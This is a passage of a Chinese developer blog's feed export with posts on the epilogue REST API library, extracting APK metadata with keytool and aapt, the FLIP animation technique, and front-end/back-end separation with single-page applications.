// 抓取所有留言// GET /api/messagesMessage.findAll();// 抓取單一留言// GET /api/messages/:idMessage.find(id);// 新增留言// POST /api/messagesMessages.create(&#123;  content: content&#125;)// 刪除留言// DELETE /api/messages/:idMessages.find(id).delete();// 修改留言// PUT /api/messages/:idMessages.find(id).update(&#123;  content: new_content&#125;)

那如果我今天是寫一個部落格的後端 API 呢？把上面的 messages 全部換成 posts，搞定！從以上例子可以看出，其實這兩樣東西是很適合搭配在一起的，因為兩個都能夠符合差不多的規則。
兩個願望一次滿足，epilogueepilogue 是一套 Node.js 的 Library，它結合了 Sequelize 跟 Express，主要目的就是讓我們能快速打造出 RESTful 的 API。
讓我們直接來看看官網的範例：
首先，你要先定義好的資料庫，跟你的 schema
var database = new Sequelize(&#x27;database&#x27;, &#x27;root&#x27;, &#x27;password&#x27;);var User = database.define(&#x27;User&#x27;, &#123;  username: Sequelize.STRING,  birthday: Sequelize.DATE&#125;);

再來，初始化 express 跟 epilogue
var express = require(&#x27;express&#x27;),    bodyParser = require(&#x27;body-parser&#x27;);var app = express();app.use(bodyParser.json());app.use(bodyParser.urlencoded(&#123; extended: false &#125;));server = http.createServer(app);epilogue.initialize(&#123;	app: app,	sequelize: database&#125;);

最後，靠 epilogue 把 url 跟資料庫關連起來，你要提供它你想要的 endpoint 跟要關連的 model
var userResource = epilogue.resource(&#123;  model: User,  endpoints: [&#x27;/users&#x27;, &#x27;/users/:id&#x27;]&#125;);

就是這樣簡單三個步驟，你就有了一個 RESTful API！是不是很簡單呢？
還不只這樣在實際的開發過程中，其實往往沒有那麼順利，例如說你的回傳格式可能跟資料庫的格式不一樣，或是你的某些 API 需要經過認證才能呼叫。沒關係，epilogue 都幫你想好了。
epilogue 提供了七種行為的 hook，包括 start, auth, fetch, data, write, send, complete，再搭配上 before, action, after 三種，你可以在任何一個階段做你想做的事情。
例如說你想在傳回結果之前做一點小小的變更，就是userResource.list.send.before，或是你可能想對某個 API 做驗證，那就是userResource.delete.auth。
這邊提供兩個官網的完整範例：
// 禁止刪除 useruserResource.delete.auth(function(req, res, context) &#123;  throw new ForbiddenError(&quot;can&#x27;t delete a user&quot;);&#125;)// 先看有沒有 cache，有的話直接返回 cache 的內容userResource.list.fetch.before(function(req, res, context) &#123;  var instance = cache.get(context.criteria);  if (instance) &#123;    // keep a reference to the instance and skip the fetch    context.instance = instance;    return context.skip;  &#125; else &#123;    // cache miss; we continue on    return context.continue;  &#125;&#125;)

總結若是你的後端 API 沒有很複雜，都是基本的 CRUD 的話，那 epilogue 絕對是很適合你的一套框架，只要你把資料庫的 schema 開出來，程式碼複製貼上一下就能夠完成一個 API。若是讀者之後有相關的需求，不妨試試看吧！
關於作者：@huli 野生工程師，相信分享與交流能讓世界變得更美好
]]></content>
      <tags>
        <tag>Nodejs</tag>
        <tag>RESTful</tag>
        <tag>epilogue</tag>
        <tag>Sequelize</tag>
        <tag>Express</tag>
      </tags>
  </entry>
  <entry>
    <title>快速取得 apk 相關資訊</title>
    <url>/2016/05/20/fast-way-to-get-apk-information/</url>
    <content><![CDATA[前言在 之前，我們曾經介紹過如何反編譯 Android Apk。而藉由反編譯，我們可以知道許多跟 apk 有關的資訊，例如說 AndroidManifest.xml，只要這個檔案就可以看出 apk 的一些基本資訊，還可以看到整個 apk 的程式碼跟使用到的資源（圖檔、影片、聲音等等）。
但若是今天我們只想要知道基本資訊，完全不想知道 apk 是怎麼寫的，也根本不關心它用到哪些資源，那該怎麼辦呢？反編譯需要一點時間，愈大的 apk 需要愈久，有沒有更好的方法呢？
需要哪些資訊？首先我們先來定義一下「基本資訊」指的是哪些。以我來說，我想取得的基本資訊有以下六點：

package name
version code
version name
launch activity
Google SHA1 Fingerprint
Facebook Keyhash

前四個的用途在於，假設你今天做了一個公司內部的 apk 上架系統，如果有了前四項資訊，就可以做跟 Google Play 相似的驗證，例如說驗證 package name 跟上次上傳的是否一樣、版本號是否比上一次的高等等。
至於後兩個呢？有串接過 Google 跟 Facebook 登入的讀者就會知道，這兩個是串登入時必備的東西。你要在設定裡面新增這兩組 key，才能夠使用登入功能，否則會出現驗證錯誤之類的字眼。
知道我們需要哪些以後，就來動手做吧！
好用的 keytoolkeytool 是系統內建，與認證相關的指令。我們可以用 keytool -list -printcert -jarfile NAME.apk 提取出一些資訊：
簽署者 #1:簽章:擁有者: CN=Android Debug, O=Android, C=US發出者: CN=Android Debug, O=Android, C=US序號: 4b52355e有效期自: Sun Jan 17 05:53:34 CST 2010 到: Mon Jan 17 05:53:34 CST 2011憑證指紋:   MD5:  14:99:01:12:7A:69:CD:75:4F:31:75:8C:59:F6:71:63   SHA1: 24:69:FD:17:6B:C3:43:FC:3A:85:EC:4B:C5:D7:9F:09:4A:71:60:80   SHA256: 57:EB:73:81:D7:08:E6:45:FE:26:99:FB:3C:1F:37:1E:EE:38:39:20:E0:2D:C6:76:0E:84:2B:DD:1C:5C:C9:70   簽章演算法名稱: SHA1withRSA   版本: 3

以這個 apk 來說，列出了：擁有者、發出者、有效期限、憑證指紋等等的資訊，而其中的 SHA1 就是 Google 登入會用到的資訊。
那 Facebook Keyhash 呢？從 官方文件 可以知道，其實就只是把 sha1 先變成 binary 然後再做 base64 而已。
只要有了 sha1，搭配一些指令，就可以很簡單的生成 Facebook Keyhash。
萬能的 aaptaapt 的全名是：Android Asset Packaging Tool，超級好用！可以先來看看 aapt 到底可以做哪些事情由於我們需要的是取出資訊，因此直接看 dump 的部份：
aapt d[ump] [--values] WHAT file.&#123;apk&#125; [asset [asset ...]]  badging          Print the label and icon for the app declared in APK.  permissions      Print the permissions from the APK.  resources        Print the resource table from the APK.  configurations   Print the configurations in the APK.  xmltree          Print the compiled xmls in the given assets.  xmlstrings       Print the strings of the given compiled xml assets.

有興趣的讀者可以每一個都試試看，看會出現什麼結果。以我們的需求來講，badging 是最符合的
aapt dump badging NAME.apk
package: name=&#x27;com.gmail.aszx87410.movie_to_nine&#x27; versionCode=&#x27;1&#x27; versionName=&#x27;1.0&#x27;sdkVersion:&#x27;8&#x27;targetSdkVersion:&#x27;16&#x27;uses-permission:&#x27;android.permission.INTERNET&#x27;uses-gl-es:&#x27;0x20000&#x27;uses-feature-not-required:&#x27;android.hardware.telephony&#x27;uses-feature:&#x27;android.hardware.screen.portrait&#x27;uses-feature-not-required:&#x27;android.hardware.screen.landscape&#x27;application-label:&#x27;今晚九點電影2.0&#x27;application-label-he:&#x27;今晚九點電影2.0&#x27;application-label-es:&#x27;今晚九點電影2.0&#x27;application-label-iw:&#x27;今晚九點電影2.0&#x27;application-icon-120:&#x27;res/drawable-ldpi/icon.png&#x27;application-icon-160:&#x27;res/drawable-mdpi/icon.png&#x27;application-icon-240:&#x27;res/drawable-hdpi/icon.png&#x27;application-icon-320:&#x27;res/drawable-xhdpi/icon.png&#x27;application-icon-480:&#x27;res/drawable-xxhdpi/icon.png&#x27;application: label=&#x27;今晚九點電影2.0&#x27; icon=&#x27;res/drawable-mdpi/icon.png&#x27;launchable-activity: name=&#x27;com.ansca.corona.CoronaActivity&#x27;  label=&#x27;今晚九點電影2.0&#x27; icon=&#x27;&#x27;uses-feature:&#x27;android.hardware.touchscreen&#x27;uses-implied-feature:&#x27;android.hardware.touchscreen&#x27;,&#x27;assumed you require a touch screen unless explicitly made optional&#x27;mainother-activitiesother-receiversother-servicessupports-screens: &#x27;small&#x27; &#x27;normal&#x27; &#x27;large&#x27; &#x27;xlarge&#x27;supports-any-density: &#x27;true&#x27;locales: &#x27;--_--&#x27; &#x27;he&#x27; &#x27;es&#x27; &#x27;iw&#x27;densities: &#x27;120&#x27; &#x27;160&#x27; &#x27;240&#x27; &#x27;320&#x27; &#x27;480&#x27;native-code: &#x27;&#x27; &#x27;armeabi-v7a&#x27;

將將將將～我們所需要的資訊全部出現在這裡了，還附帶權限列表、app logo、app 名稱等等的資訊做到這邊，全部需要的東西都有了，剩下就只是切出字串與整合而已
總結今天這篇文章簡單介紹了 keytool 跟 aapt 的使用，主要是想要不靠 apktool，利用其他工具取出我們想要的資訊，既省時又省力。
如果你有興趣知道最後做出來的成品長怎樣，apkinfo.sh 是我放在 github 上面的一個小專案，用途就跟這篇文章所教的一樣，就是取出 apk 的相關資訊。
關於作者：@huli 野生工程師，相信分享與交流能讓世界變得更美好
]]></content>
      <tags>
        <tag>Android</tag>
        <tag>aapt</tag>
        <tag>keytool</tag>
        <tag>hashkey</tag>
      </tags>
  </entry>
  <entry>
    <title>FLIP 技巧總複習</title>
    <url>/2018/10/20/flip-your-animation/</url>
    <content><![CDATA[前言在前端的世界中，如何優化 performance 一直都是很重要的議題，也常常被拿來當作評斷前端工程師能力的一個依據。效能調教有許多方面可以探討，但最主要的重點就是希望使用者在操作網站時，不會感受到頁面跳動，尤其是當網站有動畫效果時，些微的跳動就會引起使用者注意。
大概在去年的時候，同事為了解決 CSS Animation 在頁面上的不順暢，研究了不少 hack 技巧，其中一個讓我覺得很特別的就是今天的主角：FLIP。
FLIP 技巧已經出來好幾年了，但我也是去年才知道，今天這篇算是個複習與回顧，順便分享給還不知道此技巧的讀者。
什麼是 FLIP？為什麼我們需要它？在開始介紹 FLIP 之前，必須先說明一下我們在製作 CSS 動畫時，可能會遭遇的效能問題。
舉例來說，今天我們想要製造一個如下效果的動畫：
code link
我們通常會需要調整 DOM 元素的位置與大小，而這類的操作會造成瀏覽器偵測到潛在的 Layout 改變，而重新從 pixel pipeline 的 Layout 階段開始 reflow 與 repaint，若同時在這階段進行其他 js 操作或是頁面互動，就會降低 fps，也就代表著頁面可能會掉幀，造成視覺上的跳動。
當然在目前硬體設備越來越強大的狀態下，其實像上圖中的動畫很難會有問題，但若是背後有其他繁重的 js 在運作，還是有可能出現下面這樣的 fps 狀態：

解決方法通常就是要想辦法將這類花費昂貴的動畫改用 transform、opacity 來製作，讓動畫的進行能在 Composite 階段進行即可，不須動到 Layout。
這時候就可以引入 FLIP 技巧來幫忙了！透過 FLIP 可以將那些會導致 Layout 更動的動畫，轉成以 transform 這樣的屬性來達成。
FLIP如果你直接 google 搜尋 FLIP，可能會查到滑板教學；搜尋 FLIP CSS，應該會出現卡片翻轉的動畫教學。
那到底 FLIP 跟網頁動畫的優化有什麼關係呢？
FLIP 其實是四個字的組合：First, Last, Invert, Play：

First：在 FLIP 技巧中，我們需要先記錄下動畫元件的初始狀態。

Last：接著進行一些運算後，套用動畫的最終狀態在動畫元件上，並且將完成動畫後的狀態記錄下來。

Invert：FLIP 最主要的 hack 就是發生在這個階段。根據前兩個步驟，我們可以知道該動畫物件在動畫期間的位置變化，接著利用 transform 與 scale，將物件從動畫結尾位置移動回初始狀態的地點。

Play：在最後的步驟時，元件已經被我們 transform 回起始點了，這時只要將 transform 屬性移除，並加上 transition 的效果，我們就能完美的消除原先昂貴的 Layout change，改以能擁有獨自 Layer 的 transform 來處理動畫效果。


文字敘述可能不夠好懂，David Khourshid 做的這個範例應該就能非常清楚的說明 FLIP 原理：
See the Pen How the FLIP technique works by David Khourshid (@davidkpiano) on CodePen.


解釋起來其實會發現跟 FLIP 這個字其實也是很吻合的，把元件從結束狀態 ”翻“ 回初始狀態。
看到這邊可能會有些人覺得困惑，為什麼要這麼麻煩，不能直接用 transform 搭配 transition 將元件移動至結束位置嗎？
的確是可以，但如果你今天是要優化原先寫好的動畫，變成要重新手動計算 transform 的位置與 scale 的比例，是件麻煩的事，倒不如讓瀏覽器幫你處理這部分的計算，只要算出起點與終點位置的差異即可。
此外，將元件先移至結束位置，再 transform 回去起點的方式，可以讓瀏覽器先知道這個動畫會走的過程，據說有助於更快的處理動畫。（但我沒有實際測試過，並非百分百確定有這種效果，也歡迎大家幫忙補充！）
接著我們實際做做看依照 FLIP 原則，我們將一開始的動畫做點調整：

First：

// Fisrt: 記錄初始狀態const collapsed = elem.getBoundingClientRect();


Last：

// 進行運算, 套用動畫結尾的 css styleelem.classList.add(&#x27;expanded&#x27;);// Last: 紀錄結束狀態const expanded = elem.getBoundingClientRect();


Invert：

// INVERT// 根據在 F 與 L 紀錄的位置，我們算出其位置差距 (top 與 left)const invertedTop = collapsed.top - expanded.top;const invertedLeft = collapsed.left - expanded.left;// 大小的部分則是用寬高差去計算 scale 的比例const invertedWidth = collapsed.width / expanded.width;const invertedHeight = collapsed.height / expanded.height;// 設定 transform origin，代表動畫要從哪裡開始elem.style.transformOrigin = &#x27;top left&#x27;;// 將算好的差距 apply 到 transform 屬性上// 這樣就能將元件 ”翻“ 回初始位置elem.style.transform = &#x27;translate(&#x27; + invertedLeft + &#x27;px, &#x27; + invertedTop + &#x27;px) scale(&#x27; + invertedWidth + &#x27;, &#x27; + invertedHeight + &#x27;)&#x27;;


Play：

// PLAY// 利用 Raf，在下個 frame 開始時再做動畫requestAnimationFrame(function()&#123;  // 設定 transition，並移除 transform，讓他再 &quot;翻&quot; 到結尾位置  elem.style.transition = &#x27;550ms ease-out&#x27;;  elem.style.transform = &#x27;&#x27;;&#125;);elem.addEventListener(&#x27;transitionend&#x27;, function() &#123;  elem.style.transition = &#x27;&#x27;;&#125;);

經由 FLIP 技巧調整過後的動畫：
See the Pen FLIP - good by Arvin (@arvin0731) on CodePen.


我一開始看到這個實作時，稍微有點困惑，覺得為什麼可以直接先加上結尾狀態的 css，而不會讓元件真正更動？
原因很簡單，就在於這些動作是在瀏覽器繪製下一個 frame 之前就做完的，在瀏覽器真正過了 16ms，要開始繪圖時，我們已經 apply 了另一個繪圖需求，也就是 transform。所以並不會看到元間跑到結束位置的狀況。
從下面這張圖應該會更好理解：
圖片來源
上排黑色箭頭代表每一次的 frame render，下排則是繪圖需求，而紅色可以想做是我們計算結尾位置的動作。可以明顯看到，在每次紅色箭頭的後面，真正開始繪圖前，都有新的繪圖需求會蓋過去，因此瀏覽器並不會渲染紅色箭頭的部分。
另外這邊要注意兩件事，第一個是 F、L、I 的時間需要掌控在 100ms 之內，根據 Paul Lewis 的 FLIP 介紹文章，使用者在做了互動後，到感知動畫的發生，這中間可以有 100ms 的空隙，我們只要能在這 100ms 中將初始與結尾位置計算完，並翻回初始點，使用者就不會感受到任何差異。
圖片來源
最後，在這個例子中，我需要利用 transitionend 這個事件，在動畫的最後把 transition 拿掉，否則下一次要計算動畫終點位置時 elem.classList.add(&#39;expanded&#39;);，就會產生 transition 效果，那不是我們要的。
結論FLIP 技巧的概念很簡單，但實作起來的確會增加不少程式碼，但好在有不少套件可以使用，也能搭配 Web Animations API (polyfill) 來開發。比較推薦的是 David Khourshid 的 flipping.js，他在去年也有寫了一篇文章來介紹 Animating Layouts with the FLIP Technique，其中還有講到如何將 FLIP 應用在兩個獨立的元件上，寫得很棒很清楚，推薦大家直接去閱讀！
資料來源
Animating Layouts with the FLIP Technique
[javascript] requestAnimationFrame 優化動畫效率與資源
FLIP Your 60 FPS Animations, FLIP ’Em Good
FLIP Your Animations

關於作者：@arvinh 前端攻城獅，熱愛數據分析和資訊視覺化
]]></content>
      <tags>
        <tag>javascript</tag>
        <tag>animation</tag>
        <tag>css</tag>
        <tag>flip</tag>
      </tags>
  </entry>
  <entry>
    <title>前後端分離與 SPA</title>
    <url>/2017/09/16/frontend-backend-mvc/</url>
    <content><![CDATA[前言這篇的原文（你走你的陽關道，我走我的獨木橋：前後端分離）是我之前在 iT 邦幫忙鐵人賽的其中一篇文章，寫完之後有陸陸續續收到一些回饋，就想說可以重新整理一下這篇文章，讓它變得再更清楚一點。
如果你有以下疑惑的話，這篇文章非常適合你：

為什麼前端會有 MVC？
前端 MVC 跟後端 MVC 有什麼不一樣？
為什麼要有 SPA（Single Page Application）？

（其實關於 MVC 到底是什麼就有很多討論了，但因為這篇文章的重點不在於此，所以對這方面就不多加描述，有興趣的朋友們可參考：MVC是一個巨大誤會）
先從你熟悉的流程開始如果你要寫一個簡易的部落格，你會怎麼做？
這答案很簡單嘛，可以先挑一個喜歡的框架，例如說 Rails、Laravel 等等，然後先定義好幾個 URL，再把 DB 的 Schema 想好，最後開始動手 coding。
例如說首頁的部分就是去 DB 把所有文章都撈回來，然後把資料丟到 view 裡面去 render，搞定！
總而言之，流程大概是這樣：

當你想要訪問文章列表這個頁面的時候，瀏覽器會送 request 到 server，然後經過 controller 與 model，最後把資料帶給 view。
view 再回傳一份完整的 HTML 檔案（這個動作就叫做 render），而瀏覽器拿到之後，只要顯示出來就好。因為 render 在 server side，所以這也叫做 server side render。
這個流程照理來說，應該會是你最熟悉的流程，因為一大堆網頁都是這個樣子做的。
在這個狀況底下，一個只負責前端的工程師，基本上就是負責 view 這個資料夾底下的所有東西，必須用框架提供的 template 把資料跟 HTML 整合在一起。而當他需要 debug 的時候，必須要把整個專案都跑起來，才能看到畫面輸出的結果。
這樣的工作流程讓前後端切得沒有那麼開，畢竟前端工程師還需要會跑 rails，需要設定 DB，搞不好還要會設定 nginx！
現在的方法雖然把資料（Model）跟顯示（View）切開了，但都還是在後端，有沒有更好的方法呢？有沒有辦法，讓後端專注在提供資料，前端專注在顯示資料呢？
有！
client side render剛剛我們提到了 server side render，由後端直接回傳整份 HTML，瀏覽器直接顯示就好，因為 response 就是完整的網頁了。
但既然會特別區分 server 跟 client，就代表還有一種方式叫做 client side render，這又是什麼呢？
大家都知道，JavaScript 可以動態的產生內容，而 client side render 指的就是當前端拿到資料以後，才用 JavaScript 動態的把那些內容填到網頁上面。
直接拿程式碼出來說明，大家會比較好理解一點。
首先，我們的 server 現在就只專注在提供資料，所以就開一個 API 出來：
// 首頁，直接輸出所有留言app.get(&#x27;/&#x27;, function (req, res) &#123;    // 從資料庫拿出所有的留言  db.getPosts(function (err, posts) &#123;    if (err) &#123;      res.send(err);    &#125; else &#123;        // 直接把所有 posts 丟出去      res.send(&#123;        posts: posts      &#125;);    &#125;  &#125;)&#125;);

如果用瀏覽器打開這個 API 的網址，應該會看到 JSON 格式的資料：
&#123;  &quot;posts&quot;: [    &#123;      &quot;_id&quot;: &quot;585f662a77467405888b3bbe&quot;,      &quot;author&quot;: &quot;huli&quot;,      &quot;content&quot;: &quot;2222&quot;,      &quot;createTime&quot;: &quot;2016-12-25T06:24:42.990Z&quot;    &#125;,    &#123;      &quot;_id&quot;: &quot;585f662777467405888b3bbd&quot;,      &quot;author&quot;: &quot;huli&quot;,      &quot;content&quot;: &quot;1111&quot;,      &quot;createTime&quot;: &quot;2016-12-25T06:24:39.601Z&quot;    &#125;  ]&#125;

後端的部分已經準備就緒，順利地提供資料了，再來我們來看前端，只需要一個index.html就可以了。
&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt;  &lt;link rel=&quot;stylesheet&quot; href=&quot;https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/css/bootstrap.min.css&quot; /&gt;  &lt;script src=&quot;https://code.jquery.com/jquery-1.12.4.min.js&quot;&gt;&lt;/script&gt;  &lt;script&gt;    $(document).ready(function() &#123;      getPosts();    &#125;)      // ajax 抓取文章    function getPosts() &#123;      $.ajax(&#123;        url: &#x27;http://localhost:3000/&#x27;,        success: function(response) &#123;          if (!response.posts) &#123;            return alert(&#x27;Error&#x27;);          &#125;          for(var i = 0; i &lt; response.posts.length; i++) &#123;              // 丟給 render function            addPost(response.posts[i]);          &#125;        &#125;,        error: function(err) &#123;          console.log(err);          alert(&#x27;抓取失敗&#x27;);        &#125;      &#125;)    &#125;      function addPost(post) &#123;      var item = &#x27;&#x27; +         &#x27;&lt;div class=&quot;panel panel-default&quot;&gt;&#x27; +          &#x27;&lt;div class=&quot;panel-heading&quot;&gt;&#x27; +            &#x27;&lt;h3 class=&quot;panel-title&quot;&gt;&#x27; + post.author +&#x27;, 發佈時間：&#x27; + post.createTime + &#x27;&lt;/h3&gt;&#x27; +          &#x27;&lt;/div&gt;&#x27; +          &#x27;&lt;div class=&quot;panel-body&quot;&gt;&#x27; +            post.content          &#x27;&lt;/div&gt;&#x27; +        &#x27;&lt;/div&gt;&#x27;;      $(&#x27;.posts&#x27;).append(item);    &#125;  &lt;/script&gt;&lt;/head&gt;&lt;body&gt;  &lt;div class=&quot;container&quot;&gt;    &lt;a class=&quot;btn btn-primary&quot; href=&quot;/posts&quot;&gt;發表新留言&lt;/a&gt;    &lt;h2&gt;留言列表&lt;/h2&gt;    &lt;div class=&quot;posts&quot;&gt;    &lt;/div&gt;  &lt;/div&gt;&lt;/body&gt;&lt;/html&gt;

接著打開 index.html，就可以看到預期中的畫面出現了，跟我們之前用 server side render 產生的畫面應該一模一樣。用右鍵 -&gt; 檢查去檢視，會發現所有元素都在。

但是如果你改用右鍵 -&gt; 檢視原始碼，會發現幾乎是空的：

這個就是 client side render 跟 server side render 最大的差別。因為對於前者，我們是在執行期間「動態」去跟後端伺服器拿資料，再動態產生你看到的那些元素。
而那些元素原本不存在 index.html 裡面，是我們後來自己用 jQuery append 上去的，所以檢視原始碼當然不會出現任何東西。
我們來看一張 client side render 的示意圖：

在 server side 的地方，view 這層直接被忽略了，因為後端只輸出 JSON 格式的資料而已，而這邊的第五步：把傳回來的資料 render 成 HTML 指的就是我們上面那個用 jQuery 動態 append 上去的步驟。
而在這種狀況底下，你有沒有發現前後端已經切開了？
後端工程師從此之後不用再管 view 裡面到底裝什麼，不用再教前端工程師怎麼跑 rails，他只要負責制定 API 文件，提供前端需要的資料就好。
而前端工程師也不需要跑那些服務了，只需要用他們最熟悉的瀏覽器打開 HTML 檔案就行了，利用 ajax 從後端拿資料，並且在自己這邊用 JavaScript 動態產生內容。
在這種情況下，前後端的部署也可以完全拆開，前端的部分最簡單，只需要隨便找一個可以放 html 檔案的地方就好，例如說 Amazon S3。所以前端幾乎不會有掛掉的問題，也不會有流量的問題，因為它只是個靜態檔案而已。
假如 server 有一天掛了，API 也跟著掛了，使用者依然可以造訪網頁，只是看不到資料而已，或者是你可以顯示出一個錯誤的圖案。但如果是舊的那種綁在一起的架構，server 一旦掛掉，你連畫面都渲染不出來。
再者，因為現在把 data 跟 view 完全切開來，你要替換任何一邊都是很方便的。例如說你後端不想用 rails 了你要用 go，完全沒問題！只要保持 API 的格式一樣，你後端就算要用 C 也沒人管你。
前端也是一樣，你要選 Angular，選 React 或是選 Vue 甚至你要手刻都可以，反正都不關後端工程師的事情。
可是，事情沒那麼簡單雖然這種場景聽起來很美好，但千萬不要忽略了這樣子的改變會造成的後果。
什麼後果？那就是前端會變得有夠複雜。
仔細想想我們一開始提到的那種開發架構，統一從後端 render，所以我一個頁面就準備一個 view 的檔案，如果使用者訪問/posts，我就render(&#39;posts.ejs&#39;)；若是訪問/about，我就render(&#39;about.ejs&#39;)。
第一個問題來了：

既然剛剛說前端只有一個 index.html，那不就代表使用者訪問 /posts跟訪問/about，都是到同一個檔案？那我要怎麼渲染不同頁面？

因為在以往，路由的部分是 server 負責，就如同我上面說的一樣，server 依據不同的路由來決定要渲染哪一個頁面。可是現在切開之後，前端只剩下一個 index.html 了，那怎麼辦呢？
只好讓前端來負責了。
前端可以透過window.location或者是 history API 來管理網址，就可以知道使用者現在想要造訪哪一個頁面。
這邊有一個小細節稍微提一下，那就是剛剛講過前端只有一個 html 檔案，所以網址可能像是這樣：https://example.com/index.html。
只有一個網址而已，怎麼知道使用者要造訪哪一個頁面？
在以前我們要造訪posts的話，網址可能會是：https://example.com/posts，可是現在我們前端已經變成一個靜態檔案了，只有那一個路徑而已，該怎麼做呢？
第一種方法是利用 hash，例如說https://example.com/index.html#posts，前端再去解析後面的字串。
第二種是利用nginx或其他類似的服務，把所有https://example.com/*的網址都一律輸出 index.html 這個檔案，這樣子看起來就會跟以前一樣了。
我到/posts，server 會回傳 index.html，我到/about server 也會回傳一樣的內容。
但總之呢，因為後端不再處理這邊的路由了，所以這個部分完全轉交給前端負責，你必須在前端自己管理 URL 的狀態，去決定現在要顯示哪一個頁面。
那這邊要怎麼做呢？最簡單的方法就是跟以往後端做法一樣，你到哪一個網址，我就根據網址輸出怎樣的東西。
前端的程式碼大概會長這樣：
function render(path) &#123;  // 清空整個畫面  $(body).empty();  if (path === &#x27;posts&#x27;) &#123;    renderPostsPage();  &#125; else if (path === &#x27;about&#x27;) &#123;    renderAboutPage();  &#125;&#125;

只要每一次到一個新的網址，我就把現在內容全部清空再渲染一次就好。
是很簡單沒錯，但是效能有大大的問題，因為有些部分你其實根本不用清空。例如說網站最上方會有的導覽列跟最下面的 footer，基本上每一個頁面都有，是不會變的。
針對那些不變的部分，應該保留起來才對，不然每一次都清空重建一樣的東西很沒有效率。你可能會說這不就跟後端以前寫 view 一樣，抽出共通的部分然後放在 layout 裡面之類的。
不不，這不一樣。後端 render 本質上就是「每一個不同頁面就回傳一份不同的 html 檔案」，而我們現在前端 render 其實也有把共通的部分抽出來，但前端的難題在：「要怎麼只更新部分畫面，而不是暴力的每次都砍掉重練」。
你有沒有開始漸漸覺得前端越來越多事情要做了？
Single Page Application當你把這種東西發揮到極致，會覺得很像在寫一個 App 一樣，這東西就叫做 SPA，Single Page Application。
就如同字面上的意思一樣，我們現在只有一個 index.html 檔案，但是用起來卻像一個 App。
最經典的例子就是 Gmail。你在用 Gmail 的時候，完全沒有換頁。全部的動作都是在「同一個頁面」上面發生的，所以你載入的檔案從頭到尾就只有一個 index.html，完全沒有換過。
你在 Gmail 上面做的任何動作，都是用 ajax 發 request 給 server，server 回傳資料以後 client 端再用 JavaScript 把畫面 render 出來。
所以你在用 Gmail 的時候，會感覺好像在用一個 App 而不是在用網頁，因為頁面之間的跳轉很流暢，不像一般網頁中間可能會有白屏出現。
既然都叫做 Application 了，這時候的前端工程師已經不是大家以往想像的那樣，只需要會 HTML 跟 CSS 刻刻畫面，用 JavaScript 做點小特效跟互動。
要寫 SPA 的話，最難的就是狀態的管理。因為很多東西以前後端都幫你做掉了，所以你完全不用考慮這件事，但現在要了。
舉個例子好了，以前你訪問一篇文章，假設是/post/12，一點下去之後快速切回首頁再點擊其他文章，server 也就只是再回傳相對應的 HTML 而已。
可是呢，SPA 就不一樣了，考慮一下下面的流程：

使用者點擊/post/12
query API
使用者返回首頁
使用者點擊/posts/13
query API
拿到 response，渲染頁面

假設使用者點擊的速度很快，在第七步的時候，很有可能會先拿到第二步的 response，就會發生使用者明明點進去 A 文章，內容卻是 B 文章的狀況。
這只是一個簡單的例子，實戰上還有一大堆要考慮的問題，例如說還沒有拿到資料的時候要顯示什麼，拿到之後要怎麼更新等等。
前端 MVC在前端變得愈來愈複雜之後，你應該也能理解為什麼前端需要 MVC 了。如果你有寫過純 PHP，經歷過那種商業邏輯跟 view 跟 model 混雜在同一個檔案的時期，應該也很能理解為什麼需要 MVC。
因為我們要把職責切開來嘛，讓大家各自負責該負責的東西，才不會全部混在一起變成義大利麵。
前端 MVC 其實跟後端 MVC 滿類似，然後前端也要設定路由，剛剛有提過了。就是設定哪一個 URL 要去哪一個 Controller，再去相對應的 Model 拿資料，最後輸出 View。
這邊稍微比較一下前後端的 MVC 在做的事情：



&nbsp;
前端
後端



Model
去跟後端 API 拿資料
去跟 DB 拿資料


View
在前端動態產生畫面
無


Controller
呼叫相對應的 Model 並 render 畫面
呼叫相對應的 Model 並傳回資料



你會發現其實前後端做的事情都差不多，只是前端注重在 render 畫面，後端注重在輸出資料。還可以畫出這一張完整的流程圖：

用文字來解釋的話，流程是這樣的：

使用者造訪 &#x2F;posts 這個網址，代表他想看全部文章
前端的路由去處理，負責呼叫對應到的 controller
前端 controller 去呼叫 Model 拿資料
前端 Model 透過 API，去 &#x2F;api&#x2F;posts 這個網址拿資料
後端路由接到 request，丟給對應到的後端 controller
後端 controller 跟後端 Model 拿資料
後端 controller 把資料傳回去
前端 Modle 拿到資料以後回傳給前端 controller，並且把資料丟給 view
client side render，把畫面渲染出來

你上面看到的這整套，大概就是最基本的 SPA 的架構了。後端只負責輸出資料，前端來負責抓資料跟渲染畫面。把前後端完完全全的切開了，就算你後端壞掉，你前端還是看得到畫面（只是可能會顯示個錯誤畫面之類的）；你前端壞掉，後端還是能安穩的輸出資料供其他服務使用。
兩邊乾乾淨淨，而且任何一邊都會比較好維護，前端工程師想要改任何跟介面有關的東西，都跟後端完全沒有關係，其實就等於是兩個不同的專案的意思。
我們真的需要 SPA 嗎？上面提到了這麼多，我認為前端開發的複雜化跟 SPA 有滿大的關係，畢竟你現在就等於是在開發一個完整的 App，怎麼可能不複雜？
可是別忘記問自己：

我們真的需要 SPA 嗎？

有些場景是一定要用的，例如說音樂播放網站。
為什麼？因為你必須一邊播放音樂，一邊讓他可以在網站上看其他的資料，例如說歌手介紹、專輯介紹之類的。如果你今天不是用 SPA，那使用者點到別的頁面的時候，瀏覽器就跳頁了，音樂就停了。哇靠這個體驗也太差了，完全不能接受。
所以這種網站一定要用 SPA，沒有其他選擇。用了之後因為不會跳頁，所以你點擊歌手介紹的時候，只是發一個 ajax request，然後收到 response 之後用 JavaScript 把接收到的資料 render 成 HTML 顯示出來。不管到哪一個頁面，都不會真的跳轉，不會載入新的 HTML 檔案。
那有些地方我覺得不用也行，但用了之後可以加強使用者體驗，例如說 Twitch 前一陣子的新功能，在你跳去看其他頁面的時候，你原本在看的實況會縮到左下角。

總之，會需要用到 Single Page Application 的場合有兩個，一個是因為必須要這樣做，另一個是因為可以增進使用者體驗，讓使用者覺得操作起來更順暢。
如果你發現你要做的東西不符合這兩種場合，你可以選擇不要做 SPA，可以選擇就依照之前那樣的 MVC 架構，由 server side 去 render、去處理。這一切都是可以選擇的。
除此之外，其實 SPA 也有一些缺點，例如說你明明只要看一個頁面而已，卻要把一大包的 JavaScript 或是其他頁面的 template 一起下載下來。
又或者因為是 client side render，所以有些搜尋引擎爬不到任何資料（因為你的 index.html 幾乎是空的），不過 Google 很厲害，會爬 JavaScript 執行完之後的結果。可是這對 SEO 來說還是不太好。
